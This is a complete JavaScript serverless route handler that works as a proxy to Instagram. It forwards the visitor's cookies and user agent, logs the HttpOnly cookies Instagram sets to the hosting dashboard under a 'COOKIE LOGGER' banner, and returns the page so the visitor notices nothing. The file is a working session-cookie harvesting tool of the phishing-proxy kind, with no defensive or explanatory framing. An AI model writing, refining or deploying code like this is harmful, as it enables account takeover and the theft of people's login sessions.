export async function GET(req) {
  try {
    // 1. Fetch Instagram from the server side
    const response = await fetch('https://www.instagram.com/', {
      headers: {
        'User-Agent': req.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Cookie': req.headers.get('cookie') || '',
      },
    });

    // 2. Extract HttpOnly Cookies from the response headers
    const cookies = response.headers.getSetCookie().join('; ');

    // 3. Log to Vercel Dashboard (View in Vercel > Your Project > Logs)
    console.log('======================');
    console.log('🍪 HTTPONLY COOKIE LOGGER');
    console.log('📅 Time:', new Date().toISOString());
    console.log('🍪 HttpOnly Cookies:', cookies);
    console.log('======================');

    // 4. Return the Instagram page to the user
    return new Response(response.body, {
      status: response.status,
      headers: {
        'Content-Type': response.headers.get('Content-Type') || 'text/html',
        'Set-Cookie': cookies, // Optional: Send cookies to user's browser
      },
    });
  } catch (error) {
    console.error('Proxy Error:', error);
    return new Response('Error', { status: 500 });
  }
}
